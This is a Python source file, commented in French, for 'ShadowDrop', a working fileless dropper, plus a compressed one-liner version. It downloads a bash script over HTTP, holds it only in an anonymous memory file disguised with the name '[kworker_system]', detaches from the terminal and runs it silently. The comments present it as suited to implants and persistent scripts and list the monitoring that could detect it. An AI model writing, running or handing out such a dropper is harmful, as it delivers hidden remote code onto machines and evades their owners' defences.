#!/usr/bin/env python3
# one-liner :
# python3 -c 'import os,ctypes,urllib.request as r;L=ctypes.CDLL("libc.so.6");p=r.urlopen("http://127.0.0.1/script.sh").read();f=L.memfd_create(b"k",0);os.write(f,p);[os._exit(0) for _ in range(2) if os.fork()>0];os.setsid();[os.dup2(os.open(os.devnull,2),i) for i in(0,1,2)];os.execv("/usr/bin/bash",["bash",f"/proc/self/fd/{f}"])'
#
# =============================================================================
# ShadowDrop (net_sh_dropper.py) — Exécution en mémoire de scripts bash reçus via le réseau
# Usage : python3 net_sh_dropper.py
# =============================================================================
# Technique :
#   1. Téléchargement du script via HTTP(S) dans un buffer Python (jamais sur disque).
#   2. memfd_create(2) : crée un fichier anonyme en RAM, accessible uniquement via
#      /proc/self/fd/<n>. Contrairement au dropper binaire, MFD_CLOEXEC n'est PAS
#      positionné : le fd doit rester ouvert après execv pour que bash puisse le lire.
#   3. Double-fork (si DAEMON_MODE) : détachement du terminal de contrôle et du
#      groupe de processus parent pour éviter tout SIGHUP et orpheliner le processus.
#   4. os.execv("/usr/bin/bash", ["bash", "/proc/self/fd/<n>"]) : bash ouvre le fd
#      comme un script ordinaire. Le memfd n'a pas d'inode sur le système de fichiers ;
#      il apparaît dans /proc/<pid>/fd/ comme "/memfd:<name>" mais n'est jamais
#      écrit sur aucune partition.
#
# Différence clé avec net_bin_dropper :
#   Le binaire dropper exec le fd directement (le fd EST le binaire exécuté par le
#   noyau). Ici bash est l'exécutable, et le fd est son argument-script. Le noyau
#   ne peut pas exec un script sans shebang+interprète nativement, d'où le passage
#   explicite à bash.
#
# DAEMON_MODE = False : exécution en foreground, stdout/stderr hérités du parent.
#   Utile pour les scripts de recon dont on veut capturer la sortie.
# DAEMON_MODE = True  : double-fork, redirection vers /dev/null, détachement total.
#   Utile pour les implants ou scripts persistants.
#
# Limitations :
#   /proc/<pid>/fd/<n> révèle l'existence du memfd tant que le processus tourne.
#   Un eBPF/auditbeat watchant les appels memfd_create et execve sur /proc/*/fd/*
#   peut détecter le pattern. La communication réseau reste visible (pcap, netflow).
# =============================================================================

import ctypes
import os
import sys
import urllib.request

URL_PAYLOAD = "http://127.0.0.1/script.sh"
DAEMON_MODE = True
SCRIPT_ARGS: list[str] = []


def run_fileless() -> None:
    libc = ctypes.CDLL("libc.so.6")

    with urllib.request.urlopen(URL_PAYLOAD) as resp:
        payload = resp.read()

    memfd = libc.memfd_create(b"[kworker_system]", 0)
    if memfd == -1:
        sys.exit(1)

    os.write(memfd, payload)

    script_path = f"/proc/self/fd/{memfd}"

    if DAEMON_MODE:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)

        os.setsid()

        pid2 = os.fork()
        if pid2 > 0:
            os._exit(0)

        devnull = os.open(os.devnull, os.O_RDWR)
        for std_fd in (0, 1, 2):
            os.dup2(devnull, std_fd)

    os.execv("/usr/bin/bash", ["bash", script_path] + SCRIPT_ARGS)


if __name__ == "__main__":
    run_fileless()
